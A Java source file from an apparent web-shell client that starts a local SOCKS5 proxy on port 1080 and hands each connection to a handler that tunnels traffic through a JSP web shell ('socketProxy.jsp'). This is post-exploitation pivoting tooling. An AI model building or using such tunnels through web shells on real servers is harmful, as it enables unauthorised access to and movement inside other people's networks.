package webshellclient;

import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import webshellclient.util.Sock5ProxyHandler;

public class Sock5ProxyServer {

	private static ExecutorService executorService = Executors.newCachedThreadPool();

	private static String socketProxyServletURL = "http://localhost:8080/webshell/webshell/socketProxy.jsp";

	private static int port = 1080;

	public static void main(String[] args) {
		startServer();
	}

	public static void startServer() {
		int errorTimes = 0;
		while (errorTimes < 20) {
			try {
				ServerSocket serverSocket = new ServerSocket(port);
				System.out.println("Server started at port " + port);
				while (true) {
					Socket socket = serverSocket.accept();
					System.out.println("Connection accepted from " + socket.getRemoteSocketAddress());
					Sock5ProxyHandler handler = new Sock5ProxyHandler(socket, socketProxyServletURL);
					executorService.submit(handler);
				}
			} catch (Exception e) {
				e.printStackTrace();
				errorTimes++;
			}
		}
	}

}
